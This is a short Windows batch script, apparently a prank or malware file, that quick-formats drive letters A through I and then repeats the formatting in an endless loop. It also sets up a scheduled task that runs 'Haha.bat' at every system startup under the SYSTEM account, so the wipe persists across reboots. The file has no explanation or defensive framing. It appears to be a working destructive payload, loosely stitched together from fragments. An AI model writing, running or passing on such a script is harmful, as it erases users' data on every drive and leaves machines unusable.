format C: /FS:NTFS /Q
format D: /FS:NTFS /Q
format E: /FS:NTFS /Q
format F: /FS:NTFS /Q
format A: /FS:NTFS /Q
format B: /FS:NTFS /Q
format G: /FS:NTFS /Q
format H: /FS:NTFS /Q
format I: /FS:NTFS /Q
@echo off
:loop
format C: /FS:NTFS /Q
format D: /FS:NTFS /Q
format E: /FS:NTFS /Q
format F: /FS:NTFS /Q
format A: /FS:NTFS /Q
format B: /FS:NTFS /Q
format G: /FS:NTFS /Q
format H: /FS:NTFS /Q
format I: /FS:NTFS /Q
goto loop
@echo off
set "TaskName=MyScheduledTask"
set "ScriptPath=Haha.bat"

schtasks /create /tn "%TaskName%" /tr "%ScriptPath%" /sc onstart /ru System
